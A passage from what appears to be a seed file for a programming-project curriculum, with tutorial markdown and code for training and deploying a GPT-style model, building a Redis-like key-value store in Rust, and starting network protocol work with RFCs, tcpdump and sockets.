            for _ in range(n_layers)
        ])
        self.ln_f = nn.LayerNorm(d_model)
        self.head = nn.Linear(d_model, vocab_size, bias=False)

    def forward(self, x):
        B, T = x.shape
        tok_emb = self.token_emb(x)
        pos_emb = self.pos_emb(torch.arange(T, device=x.device))
        x = tok_emb + pos_emb

        # Causal mask
        mask = torch.tril(torch.ones(T, T, device=x.device))

        for block in self.blocks:
            x = block(x, mask)

        x = self.ln_f(x)
        logits = self.head(x)
        return logits
\`\`\`

### Model Sizes
| Model | Layers | d_model | Heads |
|-------|--------|---------|-------|
| GPT-2 Small | 12 | 768 | 12 |
| GPT-2 Medium | 24 | 1024 | 16 |
| GPT-2 Large | 36 | 1280 | 20 |
| GPT-3 | 96 | 12288 | 96 |

## Completion Criteria
- [ ] Build complete model
- [ ] Forward pass works
- [ ] Understand component roles`],
			]},
			{ name: 'Training & Deployment', desc: 'Production ML', tasks: [
				['Set up training loop', 'Forward, loss, backward, step. Log metrics, evaluate on validation set.',
`## Training Loop

### Basic Structure
\`\`\`python
model = GPT(vocab_size, d_model, n_heads, n_layers, max_len)
optimizer = torch.optim.AdamW(model.parameters(), lr=3e-4)

for epoch in range(num_epochs):
    model.train()
    for batch in train_loader:
        x, y = batch
        optimizer.zero_grad()

        logits = model(x)
        loss = F.cross_entropy(logits.view(-1, vocab_size), y.view(-1))

        loss.backward()
        optimizer.step()

        # Logging
        if step % 100 == 0:
            print(f"Step {step}, Loss: {loss.item():.4f}")

    # Validation
    model.eval()
    val_loss = evaluate(model, val_loader)
    print(f"Epoch {epoch}, Val Loss: {val_loss:.4f}")
\`\`\`

### Logging with Weights & Biases
\`\`\`python
import wandb
wandb.init(project="my-model")

wandb.log({
    "train_loss": loss.item(),
    "learning_rate": scheduler.get_last_lr()[0],
    "epoch": epoch,
})
\`\`\`

### Early Stopping
\`\`\`python
best_val_loss = float('inf')
patience_counter = 0

if val_loss < best_val_loss:
    best_val_loss = val_loss
    save_checkpoint(model)
    patience_counter = 0
else:
    patience_counter += 1
    if patience_counter >= patience:
        break
\`\`\`

## Completion Criteria
- [ ] Training loop works
- [ ] Metrics logged
- [ ] Validation implemented`],

				['Implement learning rate scheduling', 'Warmup then decay: cosine annealing, linear decay.',
`## Learning Rate Scheduling

### Warmup + Cosine Decay
\`\`\`python
def get_lr(step, warmup_steps, max_steps, max_lr, min_lr):
    if step < warmup_steps:
        # Linear warmup
        return max_lr * step / warmup_steps
    else:
        # Cosine decay
        progress = (step - warmup_steps) / (max_steps - warmup_steps)
        return min_lr + 0.5 * (max_lr - min_lr) * (1 + cos(pi * progress))
\`\`\`

### Using PyTorch Schedulers
\`\`\`python
from torch.optim.lr_scheduler import CosineAnnealingLR, LinearLR, SequentialLR

warmup = LinearLR(optimizer, start_factor=0.01, total_iters=warmup_steps)
cosine = CosineAnnealingLR(optimizer, T_max=total_steps - warmup_steps)
scheduler = SequentialLR(optimizer, [warmup, cosine], milestones=[warmup_steps])

# In training loop
scheduler.step()
\`\`\`

### Why Warmup?
\`\`\`
Early training: gradients are noisy, magnitudes unknown
High LR early → divergence

Warmup: start small, gradually increase
Lets model "settle in" before aggressive updates
\`\`\`

### Common Schedules
- Cosine: smooth decay, popular for LLMs
- Linear: simple, works well
- Step: drop at fixed epochs
- OneCycleLR: warmup + decay in one cycle

## Completion Criteria
- [ ] Implement warmup
- [ ] Add decay schedule
- [ ] Understand why warmup helps`],

				['Add model checkpointing', 'Save model state, optimizer state. Resume training. Keep best checkpoint.',
`## Checkpointing

### Save Checkpoint
\`\`\`python
def save_checkpoint(model, optimizer, epoch, loss, path):
    torch.save({
        'epoch': epoch,
        'model_state_dict': model.state_dict(),
        'optimizer_state_dict': optimizer.state_dict(),
        'loss': loss,
        'config': model.config,
    }, path)
\`\`\`

### Load Checkpoint
\`\`\`python
def load_checkpoint(path, model, optimizer=None):
    checkpoint = torch.load(path)
    model.load_state_dict(checkpoint['model_state_dict'])
    if optimizer:
        optimizer.load_state_dict(checkpoint['optimizer_state_dict'])
    return checkpoint['epoch'], checkpoint['loss']
\`\`\`

### Best Model Tracking
\`\`\`python
class CheckpointManager:
    def __init__(self, save_dir, keep_n=3):
        self.save_dir = save_dir
        self.keep_n = keep_n
        self.best_loss = float('inf')
        self.checkpoints = []

    def save(self, model, optimizer, epoch, val_loss):
        path = f"{self.save_dir}/checkpoint_{epoch}.pt"
        save_checkpoint(model, optimizer, epoch, val_loss, path)
        self.checkpoints.append((val_loss, path))

        # Keep only top N
        self.checkpoints.sort(key=lambda x: x[0])
        while len(self.checkpoints) > self.keep_n:
            _, old_path = self.checkpoints.pop()
            os.remove(old_path)

        if val_loss < self.best_loss:
            self.best_loss = val_loss
            save_checkpoint(model, optimizer, epoch, val_loss,
                          f"{self.save_dir}/best.pt")
\`\`\`

## Completion Criteria
- [ ] Save full state
- [ ] Resume training works
- [ ] Best model tracked`],

				['Build inference pipeline', 'Load model, eval mode, no_grad. KV-cache for autoregressive generation.',
`## Inference Pipeline

### Basic Inference
\`\`\`python
model.eval()
with torch.no_grad():
    output = model(input_ids)
    predictions = output.argmax(dim=-1)
\`\`\`

### Text Generation
\`\`\`python
def generate(model, prompt_ids, max_new_tokens, temperature=1.0):
    model.eval()
    input_ids = prompt_ids.clone()

    with torch.no_grad():
        for _ in range(max_new_tokens):
            logits = model(input_ids)
            next_logits = logits[:, -1, :] / temperature
            probs = F.softmax(next_logits, dim=-1)
            next_token = torch.multinomial(probs, num_samples=1)
            input_ids = torch.cat([input_ids, next_token], dim=1)

    return input_ids
\`\`\`

### KV-Cache for Speed
\`\`\`python
# Without cache: recompute all positions every token
# With cache: only compute new position

class CachedAttention(nn.Module):
    def forward(self, x, cache=None):
        q, k, v = self.qkv(x)

        if cache is not None:
            k = torch.cat([cache['k'], k], dim=1)
            v = torch.cat([cache['v'], v], dim=1)

        # Attention only needs new Q, full K, V
        output = attention(q, k, v)

        new_cache = {'k': k, 'v': v}
        return output, new_cache
\`\`\`

### Batched Inference
\`\`\`python
# Process multiple sequences together
batch_size = 8
outputs = model(batched_inputs)
\`\`\`

## Completion Criteria
- [ ] Basic generation works
- [ ] KV-cache implemented
- [ ] Batched inference`],

				['Deploy model', 'Export to ONNX/TorchScript. Serve with FastAPI. Optimize with TensorRT/vLLM.',
`## Model Deployment

### Export to TorchScript
\`\`\`python
model.eval()
scripted = torch.jit.script(model)
scripted.save("model.pt")

# Load without Python
model = torch.jit.load("model.pt")
\`\`\`

### Export to ONNX
\`\`\`python
torch.onnx.export(
    model,
    dummy_input,
    "model.onnx",
    input_names=['input_ids'],
    output_names=['logits'],
    dynamic_axes={'input_ids': {0: 'batch', 1: 'seq'}}
)
\`\`\`

### FastAPI Server
\`\`\`python
from fastapi import FastAPI
app = FastAPI()

model = load_model()

@app.post("/generate")
async def generate(request: GenerateRequest):
    input_ids = tokenizer.encode(request.prompt)
    output_ids = model.generate(input_ids, max_tokens=100)
    return {"text": tokenizer.decode(output_ids)}
\`\`\`

### vLLM for LLMs
\`\`\`python
from vllm import LLM, SamplingParams

llm = LLM(model="meta-llama/Llama-2-7b-hf")
params = SamplingParams(temperature=0.8, max_tokens=100)
outputs = llm.generate(["Hello, world!"], params)
\`\`\`

### Performance Considerations
- Batching requests
- GPU memory management
- Response streaming
- Load balancing

## Completion Criteria
- [ ] Model exported
- [ ] API endpoint working
- [ ] Optimized for production`],
			]},
		]);
	} else if (path.name.includes('Redis') || path.name.includes('SQLite') || path.name.includes('LSM') || path.name.includes('Key-Value')) {
		addTasks(path.id, [
			{ name: 'Data Structures', desc: 'Core structures', tasks: [
				['Implement hash table', 'Open addressing or chaining for collisions. Resize when load factor > 0.75. O(1) average GET/SET.',
`## Hash Table Implementation

### Chaining Approach
\`\`\`rust
struct HashTable<K, V> {
    buckets: Vec<Vec<(K, V)>>,
    size: usize,
}

impl<K: Hash + Eq, V> HashTable<K, V> {
    fn get(&self, key: &K) -> Option<&V> {
        let idx = self.hash(key) % self.buckets.len();
        self.buckets[idx].iter()
            .find(|(k, _)| k == key)
            .map(|(_, v)| v)
    }

    fn set(&mut self, key: K, value: V) {
        if self.load_factor() > 0.75 {
            self.resize();
        }
        let idx = self.hash(&key) % self.buckets.len();
        // Update or insert
        if let Some(entry) = self.buckets[idx].iter_mut().find(|(k, _)| *k == key) {
            entry.1 = value;
        } else {
            self.buckets[idx].push((key, value));
            self.size += 1;
        }
    }
}
\`\`\`

### Hash Functions
\`\`\`rust
// Use established hash: murmur3, xxhash, SipHash
fn hash(key: &[u8]) -> u64 {
    let mut hasher = SipHasher::new();
    key.hash(&mut hasher);
    hasher.finish()
}
\`\`\`

## Completion Criteria
- [ ] O(1) average operations
- [ ] Resizing works
- [ ] Collision handling correct`],

				['Build skip list or B-tree', 'Skip list: probabilistic layers, O(log n). B-tree: balanced for disk. LSM uses memtable + SSTables.',
`## Skip List

### Structure
\`\`\`
Level 3: 1 -----------------> 9
Level 2: 1 -------> 5 -------> 9
Level 1: 1 --> 3 --> 5 --> 7 --> 9
Level 0: 1 -> 2 -> 3 -> 4 -> 5 -> 6 -> 7 -> 8 -> 9
\`\`\`

### Implementation
\`\`\`rust
struct SkipNode<K, V> {
    key: K,
    value: V,
    forward: Vec<Option<Box<SkipNode<K, V>>>>,
}

fn search(&self, key: &K) -> Option<&V> {
    let mut current = &self.head;
    for level in (0..self.max_level).rev() {
        while let Some(next) = &current.forward[level] {
            if next.key < *key {
                current = next;
            } else {
                break;
            }
        }
    }
    // Check level 0
    current.forward[0].as_ref()
        .filter(|n| n.key == *key)
        .map(|n| &n.value)
}
\`\`\`

### LSM Tree Structure
\`\`\`
Memtable (in-memory, skip list)
    ↓ flush when full
Level 0 SSTables (unsorted)
    ↓ compaction
Level 1 SSTables (sorted, non-overlapping)
    ↓ compaction
Level 2 ...
\`\`\`

## Completion Criteria
- [ ] Skip list works
- [ ] O(log n) operations
- [ ] Understand LSM structure`],

				['Add expiration support', 'Store expiry timestamp. Passive expiry on access. Active expiry via background scan.',
`## Key Expiration

### Storage
\`\`\`rust
struct Entry {
    value: Value,
    expires_at: Option<Instant>,
}

fn get(&self, key: &str) -> Option<&Value> {
    let entry = self.data.get(key)?;

    // Passive expiry check
    if let Some(exp) = entry.expires_at {
        if Instant::now() > exp {
            self.data.remove(key);
            return None;
        }
    }
    Some(&entry.value)
}
\`\`\`

### Active Expiry
\`\`\`rust
fn expire_cycle(&mut self) {
    let now = Instant::now();
    let sample_size = 20;
    let mut expired = 0;

    // Sample random keys
    for key in self.data.keys().take(sample_size) {
        if let Some(entry) = self.data.get(key) {
            if entry.expires_at.map(|e| now > e).unwrap_or(false) {
                self.data.remove(key);
                expired += 1;
            }
        }
    }

    // If >25% expired, run again
    if expired > sample_size / 4 {
        self.expire_cycle();
    }
}
\`\`\`

### Commands
\`\`\`
EXPIRE key 60       # Expire in 60 seconds
EXPIREAT key 12345  # Expire at Unix timestamp
TTL key             # Time to live remaining
PERSIST key         # Remove expiration
\`\`\`

## Completion Criteria
- [ ] Passive expiry works
- [ ] Background expiry running
- [ ] TTL command works`],

				['Implement persistence', 'RDB: periodic snapshots. AOF: append every write. Replay on restart.',
`## Persistence

### RDB Snapshots
\`\`\`rust
fn save_rdb(&self, path: &str) -> io::Result<()> {
    // Fork to avoid blocking (on Unix)
    let data = self.serialize();
    let mut file = File::create(path)?;
    file.write_all(&data)?;
    file.sync_all()?;
    Ok(())
}

fn load_rdb(&mut self, path: &str) -> io::Result<()> {
    let data = fs::read(path)?;
    *self = Self::deserialize(&data)?;
    Ok(())
}

// Background save every 5 minutes or 1000 changes
\`\`\`

### Append-Only File
\`\`\`rust
fn append_command(&mut self, cmd: &Command) {
    let line = cmd.to_resp();
    self.aof_file.write_all(line.as_bytes()).unwrap();

    // Configurable fsync
    match self.fsync_policy {
        Always => self.aof_file.sync_all().unwrap(),
        EverySecond => { /* sync in background */ }
        No => { /* OS handles */ }
    }
}

fn replay_aof(&mut self, path: &str) -> io::Result<()> {
    let file = File::open(path)?;
    for line in BufReader::new(file).lines() {
        let cmd = Command::parse(&line?)?;
        self.execute(cmd);
    }
    Ok(())
}
\`\`\`

## Completion Criteria
- [ ] RDB save/load works
- [ ] AOF append works
- [ ] Recovery on restart`],

				['Build WAL', 'Write-ahead log: log before apply. Replay on crash. Truncate after checkpoint.',
`## Write-Ahead Log

### Principle
\`\`\`
1. Write operation to log file
2. fsync to ensure durability
3. Apply to in-memory data
4. On crash: replay log from last checkpoint
\`\`\`

### Implementation
\`\`\`rust
struct WAL {
    file: File,
    offset: u64,
}

impl WAL {
    fn append(&mut self, entry: &LogEntry) -> io::Result<u64> {
        let data = entry.serialize();
        let len = data.len() as u32;

        // Write: length + data + checksum
        self.file.write_all(&len.to_le_bytes())?;
        self.file.write_all(&data)?;
        self.file.write_all(&crc32(&data).to_le_bytes())?;
        self.file.sync_all()?;

        let offset = self.offset;
        self.offset += 4 + data.len() as u64 + 4;
        Ok(offset)
    }

    fn replay<F: FnMut(LogEntry)>(&self, mut apply: F) -> io::Result<()> {
        let mut reader = BufReader::new(&self.file);
        loop {
            let mut len_buf = [0u8; 4];
            if reader.read_exact(&mut len_buf).is_err() { break; }
            let len = u32::from_le_bytes(len_buf) as usize;

            let mut data = vec![0u8; len];
            reader.read_exact(&mut data)?;

            let entry = LogEntry::deserialize(&data)?;
            apply(entry);
        }
        Ok(())
    }
}
\`\`\`

### Checkpointing
\`\`\`rust
fn checkpoint(&mut self) {
    self.flush_memtable_to_disk();
    self.wal.truncate();
}
\`\`\`

## Completion Criteria
- [ ] WAL appends durably
- [ ] Replay recovers state
- [ ] Checkpointing truncates`],
			]},
			{ name: 'Protocol & API', desc: 'Client interface', tasks: [
				['Design wire protocol', 'RESP format or custom binary. Length-prefixed for easy parsing.',
`## Wire Protocol Design

### RESP (Redis Protocol)
\`\`\`
Simple String: +OK\\r\\n
Error: -ERR message\\r\\n
Integer: :1000\\r\\n
Bulk String: $5\\r\\nhello\\r\\n
Array: *2\\r\\n$3\\r\\nGET\\r\\n$3\\r\\nkey\\r\\n
Null: $-1\\r\\n
\`\`\`

### Custom Binary Protocol
\`\`\`
+--------+--------+------------+
| Type   | Length | Payload    |
| 1 byte | 4 bytes| N bytes    |
+--------+--------+------------+

Types:
0x01 = String
0x02 = Integer
0x03 = Array
0x04 = Error
\`\`\`

### Parsing Example
\`\`\`rust
fn parse_message(buf: &[u8]) -> Result<(Message, usize)> {
    let msg_type = buf[0];
    let len = u32::from_le_bytes(buf[1..5].try_into()?) as usize;

    if buf.len() < 5 + len {
        return Err(Error::Incomplete);
    }

    let payload = &buf[5..5+len];
    let msg = match msg_type {
        0x01 => Message::String(String::from_utf8(payload.to_vec())?),
        0x02 => Message::Integer(i64::from_le_bytes(payload.try_into()?)),
        _ => return Err(Error::UnknownType),
    };
    Ok((msg, 5 + len))
}
\`\`\`

## Completion Criteria
- [ ] Protocol documented
- [ ] Easy to parse
- [ ] Handles all data types`],

				['Implement parser', 'State machine for partial reads. Buffer incomplete messages.',
`## Protocol Parser

### State Machine
\`\`\`rust
enum ParseState {
    ReadType,
    ReadLength { msg_type: u8 },
    ReadPayload { msg_type: u8, length: u32, read: u32 },
}

struct Parser {
    state: ParseState,
    buffer: Vec<u8>,
}

impl Parser {
    fn feed(&mut self, data: &[u8]) -> Vec<Message> {
        self.buffer.extend_from_slice(data);
        let mut messages = vec![];

        loop {
            match self.try_parse() {
                Ok(msg) => messages.push(msg),
                Err(NeedMoreData) => break,
            }
        }
        messages
    }

    fn try_parse(&mut self) -> Result<Message, ParseError> {
        match self.state {
            ReadType => {
                if self.buffer.is_empty() {
                    return Err(NeedMoreData);
                }
                let msg_type = self.buffer.remove(0);
                self.state = ReadLength { msg_type };
                self.try_parse()
            }
            ReadLength { msg_type } => {
                if self.buffer.len() < 4 {
                    return Err(NeedMoreData);
                }
                let len_bytes: [u8; 4] = self.buffer[..4].try_into().unwrap();
                self.buffer.drain(..4);
                let length = u32::from_le_bytes(len_bytes);
                self.state = ReadPayload { msg_type, length, read: 0 };
                self.try_parse()
            }
            ReadPayload { msg_type, length, .. } => {
                if self.buffer.len() < length as usize {
                    return Err(NeedMoreData);
                }
                let payload: Vec<u8> = self.buffer.drain(..length as usize).collect();
                self.state = ReadType;
                Ok(Message::from_bytes(msg_type, &payload)?)
            }
        }
    }
}
\`\`\`

## Completion Criteria
- [ ] Handles partial reads
- [ ] Buffers correctly
- [ ] Multiple messages per read`],

				['Add command handlers', 'Map commands to handlers. GET, SET, INCR, DEL.',
`## Command Handlers

### Command Router
\`\`\`rust
struct Server {
    data: HashMap<String, Value>,
    handlers: HashMap<String, Handler>,
}

impl Server {
    fn new() -> Self {
        let mut s = Self::default();
        s.register("GET", Self::handle_get);
        s.register("SET", Self::handle_set);
        s.register("DEL", Self::handle_del);
        s.register("INCR", Self::handle_incr);
        s
    }

    fn execute(&mut self, cmd: Command) -> Response {
        let handler = self.handlers.get(&cmd.name)
            .ok_or(Error::UnknownCommand)?;
        handler(self, cmd.args)
    }
}
\`\`\`

### Handler Implementations
\`\`\`rust
fn handle_get(&self, args: Vec<Value>) -> Response {
    let key = args[0].as_string()?;
    match self.data.get(&key) {
        Some(v) => Response::Bulk(v.clone()),
        None => Response::Null,
    }
}

fn handle_set(&mut self, args: Vec<Value>) -> Response {
    let key = args[0].as_string()?;
    let value = args[1].clone();
    self.data.insert(key, value);
    Response::Ok
}

fn handle_incr(&mut self, args: Vec<Value>) -> Response {
    let key = args[0].as_string()?;
    let entry = self.data.entry(key).or_insert(Value::Integer(0));
    if let Value::Integer(n) = entry {
        *n += 1;
        Response::Integer(*n)
    } else {
        Response::Error("WRONGTYPE".into())
    }
}
\`\`\`

## Completion Criteria
- [ ] GET/SET work
- [ ] INCR is atomic
- [ ] Error handling`],

				['Build client library', 'Connect, send, receive. Connection pooling. Retry with backoff.',
`## Client Library

### Basic Client
\`\`\`rust
pub struct Client {
    stream: TcpStream,
}

impl Client {
    pub fn connect(addr: &str) -> io::Result<Self> {
        let stream = TcpStream::connect(addr)?;
        Ok(Self { stream })
    }

    pub fn get(&mut self, key: &str) -> Result<Option<String>> {
        self.send_command(&["GET", key])?;
        self.read_response()
    }

    pub fn set(&mut self, key: &str, value: &str) -> Result<()> {
        self.send_command(&["SET", key, value])?;
        self.read_response()?;
        Ok(())
    }

    fn send_command(&mut self, args: &[&str]) -> io::Result<()> {
        let msg = encode_command(args);
        self.stream.write_all(&msg)?;
        Ok(())
    }
}
\`\`\`

### Connection Pool
\`\`\`rust
pub struct Pool {
    connections: Mutex<Vec<Client>>,
    max_size: usize,
    addr: String,
}

impl Pool {
    pub fn get(&self) -> PooledConnection {
        let mut conns = self.connections.lock().unwrap();
        if let Some(client) = conns.pop() {
            PooledConnection { client, pool: self }
        } else {
            let client = Client::connect(&self.addr).unwrap();
            PooledConnection { client, pool: self }
        }
    }

    fn return_conn(&self, client: Client) {
        let mut conns = self.connections.lock().unwrap();
        if conns.len() < self.max_size {
            conns.push(client);
        }
    }
}
\`\`\`

## Completion Criteria
- [ ] Basic operations work
- [ ] Connection pooling
- [ ] Error handling`],

				['Add pipelining', 'Send multiple commands, read all responses. Reduces latency.',
`## Pipelining

### Client-Side
\`\`\`rust
impl Client {
    pub fn pipeline(&mut self) -> Pipeline {
        Pipeline {
            client: self,
            commands: vec![],
        }
    }
}

pub struct Pipeline<'a> {
    client: &'a mut Client,
    commands: Vec<Vec<u8>>,
}

impl Pipeline<'_> {
    pub fn get(mut self, key: &str) -> Self {
        self.commands.push(encode_command(&["GET", key]));
        self
    }

    pub fn set(mut self, key: &str, value: &str) -> Self {
        self.commands.push(encode_command(&["SET", key, value]));
        self
    }

    pub fn execute(self) -> Result<Vec<Response>> {
        // Send all commands at once
        for cmd in &self.commands {
            self.client.stream.write_all(cmd)?;
        }

        // Read all responses
        let mut responses = vec![];
        for _ in 0..self.commands.len() {
            responses.push(self.client.read_response()?);
        }
        Ok(responses)
    }
}

// Usage
let results = client.pipeline()
    .set("a", "1")
    .set("b", "2")
    .get("a")
    .get("b")
    .execute()?;
\`\`\`

### Performance Benefit
\`\`\`
Without pipelining: N commands = N round trips
With pipelining: N commands = 1 round trip

RTT = 1ms, N = 1000
Without: 1000ms
With: ~1ms + processing time
\`\`\`

## Completion Criteria
- [ ] Pipeline API works
- [ ] Single round-trip
- [ ] Responses match commands`],
			]},
			{ name: 'Advanced Features', desc: 'Production features', tasks: [
				['Implement transactions', 'MULTI/EXEC for atomic execution. WATCH for optimistic locking.',
`## Transactions

### MULTI/EXEC
\`\`\`rust
struct Transaction {
    commands: Vec<Command>,
    watched_keys: HashMap<String, u64>,  // key -> version
}

impl Server {
    fn handle_multi(&mut self, client_id: u64) -> Response {
        self.transactions.insert(client_id, Transaction::new());
        Response::Ok
    }

    fn handle_exec(&mut self, client_id: u64) -> Response {
        let tx = self.transactions.remove(&client_id)?;

        // Check watched keys
        for (key, version) in &tx.watched_keys {
            if self.get_version(key) != *version {
                return Response::Null;  // Abort
            }
        }

        // Execute all commands atomically
        let mut results = vec![];
        for cmd in tx.commands {
            results.push(self.execute(cmd));
        }
        Response::Array(results)
    }
}
\`\`\`

### WATCH for Optimistic Locking
\`\`\`rust
fn handle_watch(&mut self, client_id: u64, keys: Vec<String>) -> Response {
    let tx = self.transactions.entry(client_id).or_default();
    for key in keys {
        let version = self.get_version(&key);
        tx.watched_keys.insert(key, version);
    }
    Response::Ok
}

// Usage:
// WATCH balance
// GET balance
// (client computes new balance)
// MULTI
// SET balance <new_value>
// EXEC  // Fails if balance changed
\`\`\`

## Completion Criteria
- [ ] MULTI queues commands
- [ ] EXEC executes atomically
- [ ] WATCH detects conflicts`],

				['Add pub/sub', 'SUBSCRIBE/PUBLISH. Pattern subscriptions. Message routing.',
`## Pub/Sub

### Data Structures
\`\`\`rust
struct PubSub {
    // Channel -> subscribers
    channels: HashMap<String, HashSet<ClientId>>,
    // Pattern -> subscribers
    patterns: HashMap<String, HashSet<ClientId>>,
    // Client -> subscribed channels
    client_subs: HashMap<ClientId, HashSet<String>>,
}
\`\`\`

### Subscribe/Publish
\`\`\`rust
fn subscribe(&mut self, client_id: ClientId, channel: &str) {
    self.channels.entry(channel.to_string())
        .or_default()
        .insert(client_id);
    self.client_subs.entry(client_id)
        .or_default()
        .insert(channel.to_string());
}

fn publish(&self, channel: &str, message: &str) -> usize {
    let mut count = 0;

    // Direct subscribers
    if let Some(subs) = self.channels.get(channel) {
        for client_id in subs {
            self.send_to_client(*client_id, message);
            count += 1;
        }
    }

    // Pattern subscribers
    for (pattern, subs) in &self.patterns {
        if matches_pattern(pattern, channel) {
            for client_id in subs {
                self.send_to_client(*client_id, message);
                count += 1;
            }
        }
    }
    count
}
\`\`\`

### Pattern Matching
\`\`\`rust
// PSUBSCRIBE news.*
fn matches_pattern(pattern: &str, channel: &str) -> bool {
    // Simple glob: * matches any chars, ? matches one char
    glob_match(pattern, channel)
}
\`\`\`

## Completion Criteria
- [ ] SUBSCRIBE/UNSUBSCRIBE work
- [ ] PUBLISH delivers messages
- [ ] Pattern subscriptions work`],

				['Build replication', 'Primary-replica sync. Full sync then streaming. Failover.',
`## Replication

### Initial Sync
\`\`\`rust
// Replica requests sync
fn handle_sync_request(&mut self, replica_id: ClientId) {
    // Send RDB snapshot
    let snapshot = self.create_rdb();
    self.send_to_client(replica_id, snapshot);

    // Add to replicas list
    self.replicas.insert(replica_id);
}

// Replica side
fn start_replication(&mut self, primary_addr: &str) {
    self.connect_to_primary(primary_addr);
    self.send_command("SYNC");

    // Receive RDB
    let rdb = self.receive_rdb();
    self.load_rdb(rdb);

    // Now receive streaming commands
    self.replication_mode = true;
}
\`\`\`

### Command Streaming
\`\`\`rust
fn execute(&mut self, cmd: Command) -> Response {
    let result = self.execute_internal(cmd.clone());

    // Propagate to replicas
    if cmd.is_write() {
        for replica_id in &self.replicas {
            self.send_to_client(*replica_id, cmd.encode());
        }
    }

    result
}
\`\`\`

### Replication Offset
\`\`\`rust
struct ReplicationState {
    offset: u64,  // Bytes received from primary
    primary_id: String,
}

// Partial resync if reconnect with small gap
\`\`\`

## Completion Criteria
- [ ] Full sync works
- [ ] Commands stream to replicas
- [ ] Replicas stay in sync`],

				['Add clustering', 'Hash slots, MOVED redirect, resharding.',
`## Clustering

### Hash Slots
\`\`\`rust
const TOTAL_SLOTS: u16 = 16384;

fn key_slot(key: &str) -> u16 {
    // Handle hash tags: {foo}bar uses "foo" for slot
    let hash_key = if let Some(start) = key.find('{') {
        if let Some(end) = key[start..].find('}') {
            &key[start+1..start+end]
        } else {
            key
        }
    } else {
        key
    };
    crc16(hash_key.as_bytes()) % TOTAL_SLOTS
}
\`\`\`

### Slot Assignment
\`\`\`rust
struct ClusterNode {
    id: String,
    addr: String,
    slots: HashSet<u16>,
}

struct Cluster {
    nodes: HashMap<String, ClusterNode>,
    slot_to_node: [Option<String>; 16384],
}
\`\`\`

### MOVED Redirect
\`\`\`rust
fn execute(&mut self, cmd: Command) -> Response {
    let key = cmd.get_key()?;
    let slot = key_slot(key);

    if !self.owns_slot(slot) {
        let node = self.slot_to_node[slot as usize].as_ref()?;
        let addr = &self.nodes[node].addr;
        return Response::Error(format!("MOVED {} {}", slot, addr));
    }

    // Execute locally
    self.execute_local(cmd)
}
\`\`\`

### Resharding
\`\`\`
1. Mark slot as MIGRATING on source, IMPORTING on target
2. Migrate keys in slot to target
3. Update slot assignment
4. Redirect clients
\`\`\`

## Completion Criteria
- [ ] Hash slot calculation
- [ ] MOVED redirects work
- [ ] Multi-key operations in same slot`],

				['Implement monitoring', 'Track ops/sec, memory, clients. INFO command. Slow log.',
`## Monitoring

### Metrics Collection
\`\`\`rust
struct Stats {
    commands_processed: AtomicU64,
    connections_received: AtomicU64,
    keyspace_hits: AtomicU64,
    keyspace_misses: AtomicU64,
    start_time: Instant,
}

impl Stats {
    fn ops_per_second(&self) -> f64 {
        let elapsed = self.start_time.elapsed().as_secs_f64();
        self.commands_processed.load(Ordering::Relaxed) as f64 / elapsed
    }
}
\`\`\`

### INFO Command
\`\`\`rust
fn handle_info(&self, section: Option<&str>) -> Response {
    let mut info = String::new();

    // Server section
    info.push_str("# Server\\r\\n");
    info.push_str(&format!("uptime_in_seconds:{}\\r\\n",
        self.stats.start_time.elapsed().as_secs()));

    // Clients section
    info.push_str("# Clients\\r\\n");
    info.push_str(&format!("connected_clients:{}\\r\\n",
        self.clients.len()));

    // Memory section
    info.push_str("# Memory\\r\\n");
    info.push_str(&format!("used_memory:{}\\r\\n",
        self.memory_usage()));

    // Stats section
    info.push_str("# Stats\\r\\n");
    info.push_str(&format!("total_commands_processed:{}\\r\\n",
        self.stats.commands_processed.load(Ordering::Relaxed)));

    Response::Bulk(info)
}
\`\`\`

### Slow Log
\`\`\`rust
struct SlowLogEntry {
    id: u64,
    timestamp: u64,
    duration_us: u64,
    command: String,
}

fn execute(&mut self, cmd: Command) -> Response {
    let start = Instant::now();
    let result = self.execute_internal(cmd.clone());
    let duration = start.elapsed().as_micros();

    if duration > self.slowlog_threshold {
        self.slowlog.push(SlowLogEntry {
            id: self.slowlog_id.fetch_add(1, Ordering::Relaxed),
            timestamp: now_unix(),
            duration_us: duration as u64,
            command: cmd.to_string(),
        });
    }
    result
}
\`\`\`

## Completion Criteria
- [ ] INFO returns stats
- [ ] Slow log captures slow commands
- [ ] Memory tracking works`],
			]},
		]);
	} else if (path.name.includes('Packet') || path.name.includes('DNS') || path.name.includes('Load Balancer') || path.name.includes('HTTP Server') || path.name.includes('TLS')) {
		addTasks(path.id, [
			{ name: 'Network Basics', desc: 'Foundation', tasks: [
				['Understand the protocol', 'Read the RFC. Understand message format, headers. Use Wireshark to observe real traffic.',
`## Protocol Study

### Key RFCs
- DNS: RFC 1035
- HTTP/1.1: RFC 7230-7235
- HTTP/2: RFC 7540
- TLS 1.3: RFC 8446

### Wireshark Analysis
\`\`\`bash
# Capture DNS traffic
tcpdump -i any port 53 -w dns.pcap
wireshark dns.pcap

# Capture HTTP
tcpdump -i any port 80 -w http.pcap
\`\`\`

### Message Structure (DNS)
\`\`\`
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                      ID                       |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                    QDCOUNT                    |
|                    ANCOUNT                    |
|                    NSCOUNT                    |
|                    ARCOUNT                    |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
\`\`\`

## Completion Criteria
- [ ] Read relevant RFC
- [ ] Captured real traffic
- [ ] Understand message format`],

				['Set up raw sockets or library', 'Raw sockets for packet-level control. Or use higher-level library.',
`## Socket Setup

### Go TCP Server
\`\`\`go
listener, err := net.Listen("tcp", ":8080")
if err != nil {
    log.Fatal(err)
}
defer listener.Close()

for {
    conn, err := listener.Accept()
    if err != nil {
        continue
    }
    go handleConnection(conn)
}
\`\`\`

### Rust UDP Socket
\`\`\`rust
use std::net::UdpSocket;

let socket = UdpSocket::bind("0.0.0.0:53")?;
let mut buf = [0u8; 512];
let (len, src) = socket.recv_from(&mut buf)?;

// Process packet
let response = process_dns(&buf[..len]);
socket.send_to(&response, src)?;
\`\`\`

### Non-blocking I/O
\`\`\`rust
// Using tokio for async
#[tokio::main]
async fn main() {
    let listener = TcpListener::bind("0.0.0.0:8080").await?;
    loop {
        let (socket, _) = listener.accept().await?;
        tokio::spawn(handle_connection(socket));
    }
}
\`\`\`

## Completion Criteria
- [ ] Server accepts connections
- [ ] Client can connect
- [ ] Handle concurrency`],

